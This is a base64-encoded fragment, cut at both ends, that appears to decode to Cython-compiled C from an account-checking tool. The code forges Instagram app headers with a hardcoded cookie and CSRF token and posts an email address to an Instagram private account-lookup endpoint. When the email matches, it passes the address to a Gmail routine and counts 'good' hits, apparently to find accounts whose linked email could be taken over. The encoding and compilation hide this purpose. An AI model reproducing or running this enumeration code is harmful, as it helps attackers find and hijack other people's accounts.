gX19QeXhfR09UUkVGKF9fcHl4X3RfNik7XG4gIF9fUHl4X0RFQ1JFRihfX3B5eF90XzEwKTsgX19weXhfdF8xMCA9IDA7XG4gIF9fcHl4X3RfNCA9IDE7XG4gICNpZiBDWVRIT05fVU5QQUNLX01FVEhPRFNcbiAgaWYgKHVubGlrZWx5KFB5TWV0aG9kX0NoZWNrKF9fcHl4X3RfNykpKSB7XG4gICAgX19weXhfdF81ID0gUHlNZXRob2RfR0VUX1NFTEYoX19weXhfdF83KTtcbiAgICBhc3NlcnQoX19weXhfdF81KTtcbiAgICBQeU9iamVjdCogX19weXhfX2Z1bmN0aW9uID0gUHlNZXRob2RfR0VUX0ZVTkNUSU9OKF9fcHl4X3RfNyk7XG4gICAgX19QeXhfSU5DUkVGKF9fcHl4X3RfNSk7XG4gICAgX19QeXhfSU5DUkVGKF9fcHl4X19mdW5jdGlvbik7XG4gICAgX19QeXhfREVDUkVGX1NFVChfX3B5eF90XzcsIF9fcHl4X19mdW5jdGlvbik7XG4gICAgX19weXhfdF80ID0gMDtcbiAgfVxuICAjZW5kaWZcbiAge1xuICAgIFB5T2JqZWN0ICpfX3B5eF9jYWxsYXJnc1syXSA9IHtfX3B5eF90XzUsIF9fcHl4X3RfNn07XG4gICAgX19weXhfdF8yID0gX19QeXhfUHlPYmplY3RfRmFzdENhbGwoX19weXhfdF83LCBfX3B5eF9jYWxsYXJncytfX3B5eF90XzQsICgyLV9fcHl4X3RfNCkgfCAoX19weXhfdF80Kl9fUHl4X1BZX1ZFQ1RPUkNBTExfQVJHVU1FTlRTX09GRlNFVCkpO1xuICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF81KTsgX19weXhfdF81ID0gMDtcbiAgICBfX1B5eF9ERUNSRUYoX19weXhfdF82KTsgX19weXhfdF82ID0gMDtcbiAgICBfX1B5eF9ERUNSRUYoX19weXhfdF83KTsgX19weXhfdF83ID0gMDtcbiAgICBpZiAodW5saWtlbHkoIV9fcHl4X3RfMikpIF9fUFlYX0VSUigwLCAzNTEsIF9fcHl4X0wxX2Vycm9yKVxuICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzIpO1xuICB9XG4gIF9fcHl4X3RfMyA9IF9fcHl4X3RfMjtcbiAgX19QeXhfSU5DUkVGKF9fcHl4X3RfMyk7XG4gIF9fcHl4X3RfNCA9IDA7XG4gIHtcbiAgICBQeU9iamVjdCAqX19weXhfY2FsbGFyZ3NbMl0gPSB7X19weXhfdF8zLCBOVUxMfTtcbiAgICBfX3B5eF90XzEgPSBfX1B5eF9QeU9iamVjdF9GYXN0Q2FsbE1ldGhvZChfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfaGV4ZGlnZXN0LCBfX3B5eF9jYWxsYXJncytfX3B5eF90XzQsICgxLV9fcHl4X3RfNCkgfCAoMSpfX1B5eF9QWV9WRUNUT1JDQUxMX0FSR1VNRU5UU19PRkZTRVQpKTtcbiAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfMyk7IF9fcHl4X3RfMyA9IDA7XG4gICAgX19QeXhfREVDUkVGKF9fcHl4X3RfMik7IF9fcHl4X3RfMiA9IDA7XG4gICAgaWYgKHVubGlrZWx5KCFfX3B5eF90XzEpKSBfX1BZWF9FUlIoMCwgMzUxLCBfX3B5eF9MMV9lcnJvcilcbiAgICBfX1B5eF9HT1RSRUYoX19weXhfdF8xKTtcbiAgfVxuICBfX3B5eF90XzIgPSBfX1B5eF9QeU9iamVjdF9HZXRTbGljZShfX3B5eF90XzEsIDAsIDE2LCBOVUxMLCBOVUxMLCAmX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfc2xpY2VbMF0sIDAsIDEsIDEpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfMikpIF9fUFlYX0VSUigwLCAzNTEsIF9fcHl4X0wxX2Vycm9yKVxuICBfX1B5eF9HT1RSRUYoX19weXhfdF8yKTtcbiAgX19QeXhfREVDUkVGKF9fcHl4X3RfMSk7IF9fcHl4X3RfMSA9IDA7XG4gIF9fcHl4X3RfMSA9IFB5TnVtYmVyX0FkZChfX3B5eF92X2RldiwgX19weXhfdF8yKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzEpKSBfX1BZWF9FUlIoMCwgMzUxLCBfX3B5eF9MMV9lcnJvcilcbiAgX19QeXhfR09UUkVGKF9fcHl4X3RfMSk7XG4gIF9fUHl4X0RFQ1JFRihfX3B5eF90XzIpOyBfX3B5eF90XzIgPSAwO1xuICBfX3B5eF92X2RldmljZV9pZCA9IF9fcHl4X3RfMTtcbiAgX19weXhfdF8xID0gMDtcblxuICBcbiAgX19weXhfdF8yID0gTlVMTDtcbiAgX19QeXhfR2V0TW9kdWxlR2xvYmFsTmFtZShfX3B5eF90XzMsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV91dWlkKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzMpKSBfX1BZWF9FUlIoMCwgMzUyLCBfX3B5eF9MMV9lcnJvcilcbiAgX19QeXhfR09UUkVGKF9fcHl4X3RfMyk7XG4gIF9fcHl4X3RfNyA9IF9fUHl4X1B5T2JqZWN0X0dldEF0dHJTdHIoX19weXhfdF8zLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfdXVpZDQpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfNykpIF9fUFlYX0VSUigwLCAzNTIsIF9fcHl4X0wxX2Vycm9yKVxuICBfX1B5eF9HT1RSRUYoX19weXhfdF83KTtcbiAgX19QeXhfREVDUkVGKF9fcHl4X3RfMyk7IF9fcHl4X3RfMyA9IDA7XG4gIF9fcHl4X3RfNCA9IDE7XG4gICNpZiBDWVRIT05fVU5QQUNLX01FVEhPRFNcbiAgaWYgKHVubGlrZWx5KFB5TWV0aG9kX0NoZWNrKF9fcHl4X3RfNykpKSB7XG4gICAgX19weXhfdF8yID0gUHlNZXRob2RfR0VUX1NFTEYoX19weXhfdF83KTtcbiAgICBhc3NlcnQoX19weXhfdF8yKTtcbiAgICBQeU9iamVjdCogX19weXhfX2Z1bmN0aW9uID0gUHlNZXRob2RfR0VUX0ZVTkNUSU9OKF9fcHl4X3RfNyk7XG4gICAgX19QeXhfSU5DUkVGKF9fcHl4X3RfMik7XG4gICAgX19QeXhfSU5DUkVGKF9fcHl4X19mdW5jdGlvbik7XG4gICAgX19QeXhfREVDUkVGX1NFVChfX3B5eF90XzcsIF9fcHl4X19mdW5jdGlvbik7XG4gICAgX19weXhfdF80ID0gMDtcbiAgfVxuICAjZW5kaWZcbiAge1xuICAgIFB5T2JqZWN0ICpfX3B5eF9jYWxsYXJnc1syXSA9IHtfX3B5eF90XzIsIE5VTEx9O1xuICAgIF9fcHl4X3RfMSA9IF9fUHl4X1B5T2JqZWN0X0Zhc3RDYWxsKF9fcHl4X3RfNywgX19weXhfY2FsbGFyZ3MrX19weXhfdF80LCAoMS1fX3B5eF90XzQpIHwgKF9fcHl4X3RfNCpfX1B5eF9QWV9WRUNUT1JDQUxMX0FSR1VNRU5UU19PRkZTRVQpKTtcbiAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfMik7IF9fcHl4X3RfMiA9IDA7XG4gICAgX19QeXhfREVDUkVGKF9fcHl4X3RfNyk7IF9fcHl4X3RfNyA9IDA7XG4gICAgaWYgKHVubGlrZWx5KCFfX3B5eF90XzEpKSBfX1BZWF9FUlIoMCwgMzUyLCBfX3B5eF9MMV9lcnJvcilcbiAgICBfX1B5eF9HT1RSRUYoX19weXhfdF8xKTtcbiAgfVxuICBfX3B5eF90XzcgPSBfX1B5eF9QeU9iamVjdF9Vbmljb2RlKF9fcHl4X3RfMSk7IGlmICh1bmxpa2VseSghX19weXhfdF83KSkgX19QWVhfRVJSKDAsIDM1MiwgX19weXhfTDFfZXJyb3IpXG4gIF9fUHl4X0dPVFJFRihfX3B5eF90XzcpO1xuICBfX1B5eF9ERUNSRUYoX19weXhfdF8xKTsgX19weXhfdF8xID0gMDtcbiAgX19weXhfdl91dWkgPSAoKFB5T2JqZWN0KilfX3B5eF90XzcpO1xuICBfX3B5eF90XzcgPSAwO1xuXG4gIFxuICBfX3B5eF90XzcgPSBfX1B5eF9QeURpY3RfTmV3UHJlc2l6ZWQoMyk7IGlmICh1bmxpa2VseSghX19weXhfdF83KSkgX19QWVhfRVJSKDAsIDM1NCwgX19weXhfTDFfZXJyb3IpXG4gIF9fUHl4X0dPVFJFRihfX3B5eF90XzcpO1xuICBpZiAoUHlEaWN0X1NldEl0ZW0oX19weXhfdF83LCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9rcF91X1VzZXJfQWdlbnQsIF9fcHl4X3ZfdWEpIDwgKDApKSBfX1BZWF9FUlIoMCwgMzU0LCBfX3B5eF9MMV9lcnJvcilcbiAgaWYgKFB5RGljdF9TZXRJdGVtKF9fcHl4X3RfNywgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X0Nvb2tpZSwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfa3BfdV9taWRfYUhpWDJnQUxBQUV6QUoyT19jUjlYc1QyTlNXNSkgPCAoMCkpIF9fUFlYX0VSUigwLCAzNTQsIF9fcHl4X0wxX2Vycm9yKVxuICBpZiAoUHlEaWN0X1NldEl0ZW0oX19weXhfdF83LCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9rcF91X0NvbnRlbnRfVHlwZSwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfa3BfdV9hcHBsaWNhdGlvbl94X3d3d19mb3JtX3VybGVuY29kZV8yKSA8ICgwKSkgX19QWVhfRVJSKDAsIDM1NCwgX19weXhfTDFfZXJyb3IpXG4gIF9fcHl4X3ZfaGVhZGVycyA9ICgoUHlPYmplY3QqKV9fcHl4X3RfNyk7XG4gIF9fcHl4X3RfNyA9IDA7XG5cbiAgXG4gIF9fcHl4X3RfNyA9IF9fUHl4X1B5RGljdF9OZXdQcmVzaXplZCgyKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzcpKSBfX1BZWF9FUlIoMCwgMzU5LCBfX3B5eF9MMV9lcnJvcilcbiAgX19QeXhfR09UUkVGKF9fcHl4X3RfNyk7XG4gIF9fcHl4X3RfMiA9IE5VTEw7XG4gIF9fUHl4X0dldE1vZHVsZUdsb2JhbE5hbWUoX19weXhfdF8zLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfanNvbik7IGlmICh1bmxpa2VseSghX19weXhfdF8zKSkgX19QWVhfRVJSKDAsIDM1OSwgX19weXhfTDFfZXJyb3IpXG4gIF9fUHl4X0dPVFJFRihfX3B5eF90XzMpO1xuICBfX3B5eF90XzYgPSBfX1B5eF9QeU9iamVjdF9HZXRBdHRyU3RyKF9fcHl4X3RfMywgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X2R1bXBzKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzYpKSBfX1BZWF9FUlIoMCwgMzU5LCBfX3B5eF9MMV9lcnJvcilcbiAgX19QeXhfR09UUkVGKF9fcHl4X3RfNik7XG4gIF9fUHl4X0RFQ1JFRihfX3B5eF90XzMpOyBfX3B5eF90XzMgPSAwO1xuXG4gIFxuICBfX3B5eF90XzMgPSBfX1B5eF9QeURpY3RfTmV3UHJlc2l6ZWQoNSk7IGlmICh1bmxpa2VseSghX19weXhfdF8zKSkgX19QWVhfRVJSKDAsIDM2MCwgX19weXhfTDFfZXJyb3IpXG4gIF9fUHl4X0dPVFJFRihfX3B5eF90XzMpO1xuICBpZiAoUHlEaWN0X1NldEl0ZW0oX19weXhfdF8zLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfY3NyZnRva2VuLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3Vfa0E2RGNlQmRuTmlPTU1CeE1HNmNaaWQyN0tPd3MxYTApIDwgKDApKSBfX1BZWF9FUlIoMCwgMzYwLCBfX3B5eF9MMV9lcnJvcilcblxuICBcbiAgaWYgKFB5RGljdF9TZXRJdGVtKF9fcHl4X3RfMywgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X2FkaWQsIF9fcHl4X3ZfdXVpKSA8ICgwKSkgX19QWVhfRVJSKDAsIDM2MCwgX19weXhfTDFfZXJyb3IpXG5cbiAgXG4gIGlmIChQeURpY3RfU2V0SXRlbShfX3B5eF90XzMsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9ndWlkLCBfX3B5eF92X3V1aSkgPCAoMCkpIF9fUFlYX0VSUigwLCAzNjAsIF9fcHl4X0wxX2Vycm9yKVxuXG4gIFxuICBpZiAoUHlEaWN0X1NldEl0ZW0oX19weXhfdF8zLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfZGV2aWNlX2lkLCBfX3B5eF92X2RldmljZV9pZCkgPCAoMCkpIF9fUFlYX0VSUigwLCAzNjAsIF9fcHl4X0wxX2Vycm9yKVxuXG4gIFxuICBpZiAoUHlEaWN0X1NldEl0ZW0oX19weXhfdF8zLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfcXVlcnksIF9fcHl4X3ZfZW1haWwpIDwgKDApKSBfX1BZWF9FUlIoMCwgMzYwLCBfX3B5eF9MMV9lcnJvcilcbiAgX19weXhfdF80ID0gMTtcbiAgI2lmIENZVEhPTl9VTlBBQ0tfTUVUSE9EU1xuICBpZiAodW5saWtlbHkoUHlNZXRob2RfQ2hlY2soX19weXhfdF82KSkpIHtcbiAgICBfX3B5eF90XzIgPSBQeU1ldGhvZF9HRVRfU0VMRihfX3B5eF90XzYpO1xuICAgIGFzc2VydChfX3B5eF90XzIpO1xuICAgIFB5T2JqZWN0KiBfX3B5eF9fZnVuY3Rpb24gPSBQeU1ldGhvZF9HRVRfRlVOQ1RJT04oX19weXhfdF82KTtcbiAgICBfX1B5eF9JTkNSRUYoX19weXhfdF8yKTtcbiAgICBfX1B5eF9JTkNSRUYoX19weXhfX2Z1bmN0aW9uKTtcbiAgICBfX1B5eF9ERUNSRUZfU0VUKF9fcHl4X3RfNiwgX19weXhfX2Z1bmN0aW9uKTtcbiAgICBfX3B5eF90XzQgPSAwO1xuICB9XG4gICNlbmRpZlxuICB7XG4gICAgUHlPYmplY3QgKl9fcHl4X2NhbGxhcmdzWzJdID0ge19fcHl4X3RfMiwgX19weXhfdF8zfTtcbiAgICBfX3B5eF90XzEgPSBfX1B5eF9QeU9iamVjdF9GYXN0Q2FsbChfX3B5eF90XzYsIF9fcHl4X2NhbGxhcmdzK19fcHl4X3RfNCwgKDItX19weXhfdF80KSB8IChfX3B5eF90XzQqX19QeXhfUFlfVkVDVE9SQ0FMTF9BUkdVTUVOVFNfT0ZGU0VUKSk7XG4gICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzIpOyBfX3B5eF90XzIgPSAwO1xuICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzMpOyBfX3B5eF90XzMgPSAwO1xuICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzYpOyBfX3B5eF90XzYgPSAwO1xuICAgIGlmICh1bmxpa2VseSghX19weXhfdF8xKSkgX19QWVhfRVJSKDAsIDM1OSwgX19weXhfTDFfZXJyb3IpXG4gICAgX19QeXhfR09UUkVGKF9fcHl4X3RfMSk7XG4gIH1cblxuICBcbiAgX19weXhfdF82ID0gUHlOdW1iZXJfQWRkKF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2twX3VfMGQwNjdjMmY4NmNhYzJjMTdkNjU1NjMxYzljZWMyNDBfMiwgX19weXhfdF8xKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzYpKSBfX1BZWF9FUlIoMCwgMzU5LCBfX3B5eF9MMV9lcnJvcilcbiAgX19QeXhfR09UUkVGKF9fcHl4X3RfNik7XG4gIF9fUHl4X0RFQ1JFRihfX3B5eF90XzEpOyBfX3B5eF90XzEgPSAwO1xuICBpZiAoUHlEaWN0X1NldEl0ZW0oX19weXhfdF83LCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3Vfc2lnbmVkX2JvZHksIF9fcHl4X3RfNikgPCAoMCkpIF9fUFlYX0VSUigwLCAzNTksIF9fcHl4X0wxX2Vycm9yKVxuICBfX1B5eF9ERUNSRUYoX19weXhfdF82KTsgX19weXhfdF82ID0gMDtcbiAgaWYgKFB5RGljdF9TZXRJdGVtKF9fcHl4X3RfNywgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X2lnX3NpZ19rZXlfdmVyc2lvbiwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfa3BfdV80KSA8ICgwKSkgX19QWVhfRVJSKDAsIDM1OSwgX19weXhfTDFfZXJyb3IpXG4gIF9fcHl4X3ZfZGF0YSA9ICgoUHlPYmplY3QqKV9fcHl4X3RfNyk7XG4gIF9fcHl4X3RfNyA9IDA7XG5cbiAgXG4gIF9fcHl4X3RfNiA9IE5VTEw7XG4gIF9fUHl4X0dldE1vZHVsZUdsb2JhbE5hbWUoX19weXhfdF8xLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfcmVxdWVzdHMpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfMSkpIF9fUFlYX0VSUigwLCAzNjgsIF9fcHl4X0wxX2Vycm9yKVxuICBfX1B5eF9HT1RSRUYoX19weXhfdF8xKTtcbiAgX19weXhfdF8zID0gX19QeXhfUHlPYmplY3RfR2V0QXR0clN0cihfX3B5eF90XzEsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9wb3N0KTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzMpKSBfX1BZWF9FUlIoMCwgMzY4LCBfX3B5eF9MMV9lcnJvcilcbiAgX19QeXhfR09UUkVGKF9fcHl4X3RfMyk7XG4gIF9fUHl4X0RFQ1JFRihfX3B5eF90XzEpOyBfX3B5eF90XzEgPSAwO1xuXG4gIFxuICBfX3B5eF90XzQgPSAxO1xuICAjaWYgQ1lUSE9OX1VOUEFDS19NRVRIT0RTXG4gIGlmICh1bmxpa2VseShQeU1ldGhvZF9DaGVjayhfX3B5eF90XzMpKSkge1xuICAgIF9fcHl4X3RfNiA9IFB5TWV0aG9kX0dFVF9TRUxGKF9fcHl4X3RfMyk7XG4gICAgYXNzZXJ0KF9fcHl4X3RfNik7XG4gICAgUHlPYmplY3QqIF9fcHl4X19mdW5jdGlvbiA9IFB5TWV0aG9kX0dFVF9GVU5DVElPTihfX3B5eF90XzMpO1xuICAgIF9fUHl4X0lOQ1JFRihfX3B5eF90XzYpO1xuICAgIF9fUHl4X0lOQ1JFRihfX3B5eF9fZnVuY3Rpb24pO1xuICAgIF9fUHl4X0RFQ1JFRl9TRVQoX19weXhfdF8zLCBfX3B5eF9fZnVuY3Rpb24pO1xuICAgIF9fcHl4X3RfNCA9IDA7XG4gIH1cbiAgI2VuZGlmXG4gIHtcbiAgICBQeU9iamVjdCAqX19weXhfY2FsbGFyZ3NbMiArICgoQ1lUSE9OX1ZFQ1RPUkNBTEwpID8gMiA6IDApXSA9IHtfX3B5eF90XzYsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2twX3VfaHR0cHNfaV9pbnN0YWdyYW1fY29tX2FwaV92MV9hY2N9O1xuICAgIF9fcHl4X3RfMSA9IF9fUHl4X01ha2VWZWN0b3JjYWxsQnVpbGRlckt3ZHMoMik7IGlmICh1bmxpa2VseSghX19weXhfdF8xKSkgX19QWVhfRVJSKDAsIDM2OCwgX19weXhfTDFfZXJyb3IpXG4gICAgX19QeXhfR09UUkVGKF9fcHl4X3RfMSk7XG4gICAgaWYgKF9fUHl4X1ZlY3RvcmNhbGxCdWlsZGVyX0FkZEFyZyhfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfaGVhZGVycywgX19weXhfdl9oZWFkZXJzLCBfX3B5eF90XzEsIF9fcHl4X2NhbGxhcmdzKzIsIDApIDwgKDApKSBfX1BZWF9FUlIoMCwgMzY4LCBfX3B5eF9MMV9lcnJvcilcbiAgICBpZiAoX19QeXhfVmVjdG9yY2FsbEJ1aWxkZXJfQWRkQXJnKF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9kYXRhLCBfX3B5eF92X2RhdGEsIF9fcHl4X3RfMSwgX19weXhfY2FsbGFyZ3MrMiwgMSkgPCAoMCkpIF9fUFlYX0VSUigwLCAzNjgsIF9fcHl4X0wxX2Vycm9yKVxuICAgIF9fcHl4X3RfNyA9IF9fUHl4X09iamVjdF9WZWN0b3JjYWxsX0NhbGxGcm9tQnVpbGRlcihfX3B5eF90XzMsIF9fcHl4X2NhbGxhcmdzK19fcHl4X3RfNCwgKDItX19weXhfdF80KSB8IChfX3B5eF90XzQqX19QeXhfUFlfVkVDVE9SQ0FMTF9BUkdVTUVOVFNfT0ZGU0VUKSwgX19weXhfdF8xKTtcbiAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfNik7IF9fcHl4X3RfNiA9IDA7XG4gICAgX19QeXhfREVDUkVGKF9fcHl4X3RfMSk7IF9fcHl4X3RfMSA9IDA7XG4gICAgX19QeXhfREVDUkVGKF9fcHl4X3RfMyk7IF9fcHl4X3RfMyA9IDA7XG4gICAgaWYgKHVubGlrZWx5KCFfX3B5eF90XzcpKSBfX1BZWF9FUlIoMCwgMzY4LCBfX3B5eF9MMV9lcnJvcilcbiAgICBfX1B5eF9HT1RSRUYoX19weXhfdF83KTtcbiAgfVxuICBfX3B5eF90XzMgPSBfX1B5eF9QeU9iamVjdF9HZXRBdHRyU3RyKF9fcHl4X3RfNywgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X3RleHQpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfMykpIF9fUFlYX0VSUigwLCAzNjksIF9fcHl4X0wxX2Vycm9yKVxuICBfX1B5eF9HT1RSRUYoX19weXhfdF8zKTtcbiAgX19QeXhfREVDUkVGKF9fcHl4X3RfNyk7IF9fcHl4X3RfNyA9IDA7XG4gIF9fcHl4X3ZfcmVzcG9uc2UgPSBfX3B5eF90XzM7XG4gIF9fcHl4X3RfMyA9IDA7XG5cbiAgXG4gIF9fcHl4X3RfMTEgPSAoX19QeXhfUHlTZXF1ZW5jZV9Db250YWluc1RGKF9fcHl4X3ZfZW1haWwsIF9fcHl4X3ZfcmVzcG9uc2UsIFB5X0VRKSk7IGlmICh1bmxpa2VseSgoX19weXhfdF8xMSA8IDApKSkgX19QWVhfRVJSKDAsIDM3MSwgX19weXhfTDFfZXJyb3IpXG4gIGlmIChfX3B5eF90XzExKSB7XG5cbiAgICBcbiAgICBfX3B5eF90XzcgPSBOVUxMO1xuICAgIF9fUHl4X0dldE1vZHVsZUdsb2JhbE5hbWUoX19weXhfdF8xLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfR21haWwpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfMSkpIF9fUFlYX0VSUigwLCAzNzIsIF9fcHl4X0wxX2Vycm9yKVxuICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzEpO1xuICAgIF9fcHl4X3RfNCA9IDE7XG4gICAgI2lmIENZVEhPTl9VTlBBQ0tfTUVUSE9EU1xuICAgIGlmICh1bmxpa2VseShQeU1ldGhvZF9DaGVjayhfX3B5eF90XzEpKSkge1xuICAgICAgX19weXhfdF83ID0gUHlNZXRob2RfR0VUX1NFTEYoX19weXhfdF8xKTtcbiAgICAgIGFzc2VydChfX3B5eF90XzcpO1xuICAgICAgUHlPYmplY3QqIF9fcHl4X19mdW5jdGlvbiA9IFB5TWV0aG9kX0dFVF9GVU5DVElPTihfX3B5eF90XzEpO1xuICAgICAgX19QeXhfSU5DUkVGKF9fcHl4X3RfNyk7XG4gICAgICBfX1B5eF9JTkNSRUYoX19weXhfX2Z1bmN0aW9uKTtcbiAgICAgIF9fUHl4X0RFQ1JFRl9TRVQoX19weXhfdF8xLCBfX3B5eF9fZnVuY3Rpb24pO1xuICAgICAgX19weXhfdF80ID0gMDtcbiAgICB9XG4gICAgI2VuZGlmXG4gICAge1xuICAgICAgUHlPYmplY3QgKl9fcHl4X2NhbGxhcmdzWzJdID0ge19fcHl4X3RfNywgX19weXhfdl9lbWFpbH07XG4gICAgICBfX3B5eF90XzMgPSBfX1B5eF9QeU9iamVjdF9GYXN0Q2FsbChfX3B5eF90XzEsIF9fcHl4X2NhbGxhcmdzK19fcHl4X3RfNCwgKDItX19weXhfdF80KSB8IChfX3B5eF90XzQqX19QeXhfUFlfVkVDVE9SQ0FMTF9BUkdVTUVOVFNfT0ZGU0VUKSk7XG4gICAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfNyk7IF9fcHl4X3RfNyA9IDA7XG4gICAgICBfX1B5eF9ERUNSRUYoX19weXhfdF8xKTsgX19weXhfdF8xID0gMDtcbiAgICAgIGlmICh1bmxpa2VseSghX19weXhfdF8zKSkgX19QWVhfRVJSKDAsIDM3MiwgX19weXhfTDFfZXJyb3IpXG4gICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF8zKTtcbiAgICB9XG4gICAgX19QeXhfREVDUkVGKF9fcHl4X3RfMyk7IF9fcHl4X3RfMyA9IDA7XG5cbiAgICBcbiAgICBfX1B5eF9HZXRNb2R1bGVHbG9iYWxOYW1lKF9fcHl4X3RfMywgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X2dvb2RpZyk7IGlmICh1bmxpa2VseSghX19weXhfdF8zKSkgX19QWVhfRVJSKDAsIDM3NCwgX19weXhfTDFfZXJyb3IpXG4gICAgX19QeXhfR09UUkVGKF9fcHl4X3RfMyk7XG4gICAgX19weXhfdF8xID0gX19QeXhfUHlMb25nX0FkZE9iakMoX19weXhfdF8zLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9pbnRfMSwgMSwgMSwgMCk7IGlmICh1bmxpa2VseSghX19weXhfdF8xKSkgX19QWVhfRVJSKDAsIDM3NCwgX19weXhfTDFfZXJyb3IpXG4gICAgX19QeXhfR09UUkVGKF9fcHl4X3RfMSk7XG4gICAgX19QeXhfREVDUkVGKF9fcHl4X3RfMyk7IF9fcHl4X3RfMyA9IDA7XG4gICAgaWYgKFB5RGljdF9TZXRJdGVtKF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2QsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9nb29kaWcsIF9fcHl4X3RfMSkgPCAoMCkpIF9fUFlYX0VSUigwLCAzNzQsIF9fcHl4X0wxX2Vycm9yKVxuICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzEpOyBfX3B5eF90XzEgPSAwO1xuXG4gICAgXG4gICAgX19weXhfdF8zID0gTlVMTDtcbiAgICBfX1B5eF9HZXRNb2R1bGVHbG9iYWxOYW1lKF9fcHl4X3RfNywgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X3BwcHApOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfNykpIF9fUFlYX0VSUigwLCAzNzUsIF9fcHl4X0wxX2Vycm9yKVxuICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzcpO1xuICAgIF9fcHl4X3RfNCA9IDE7XG4gICAgI2lmIENZVEhPTl9VTlBBQ0tfTUVUSE9EU1xuICAgIGlmICh1bmxpa2VseShQeU1ldGhvZF9DaGVjayhfX3B5eF90XzcpKSkge1xuICAgICAgX19weXhfdF8zID0gUHlNZXRob2RfR0VUX1NFTEYoX19weXhfdF83KTtcbiAgICAgIGFzc2VydChfX3B5eF90XzMpO1xuICAgICAgUHlPYmplY3QqIF9fcHl4X19mdW5jdGlvbiA9IFB5TWV0aG9kX0dFVF9GVU5DVElPTihfX3B5eF90XzcpO1xuICAgICAgX19QeXhfSU5DUkVGKF9fcHl4X3RfMyk7XG4gICAgICBfX1B5eF9JTkNSRUYoX19weXhfX2Z1bmN0aW9uKTtcbiAgICAgIF9fUHl4X0RFQ1JFRl9TRVQoX19weXhfdF83LCBfX3B5eF9fZnVuY3Rpb24pO1xuICAgICAgX19weXhfdF80ID0gMDtcbiAgICB9XG4gICAgI2VuZGlmXG4gICAge1xuICAgICAgUHlPYmplY3QgKl9fcHl4X2NhbGxhcmdzWzJdID0ge19fcHl4X3RfMywgTlVMTH07XG4gICAgICBfX3B5eF90XzEgPSBfX1B5eF9QeU9iamVjdF9GYXN0Q2FsbChfX3B5eF90XzcsIF9fcHl4X2NhbGxhcmdzK19fcHl4X3RfNCwgKDEtX19weXhfdF80KSB8IChfX3B5eF90XzQqX19QeXhfUFlfVkVDVE9SQ0FMTF9BUkdVTUVOVFNfT0ZGU0VUKSk7XG4gICAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfMyk7IF9fcHl4X3RfMyA9IDA7XG4gICAgICBfX1B5eF9ERUNSRUYoX19weXhfdF83KTsgX19weXhfdF83ID0gMDtcbiAgICAgIGlmICh1bmxpa2VseSghX19weXhfdF8xKSkgX19QWVhfRVJSKDAsIDM3NSwgX19weXhfTDFfZXJyb3IpXG4gICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF8xKTtcbiAgICB9XG4gICAgX19QeXhfREVDUkVGKF9fcHl4X3RfMSk7IF9fcHl4X3RfMSA9IDA7XG5cbiAgICBcbiAgICBnb3RvIF9fcHl4X0wzO1xuICB9XG5cbiAgXG4gICB7XG4gICAgX1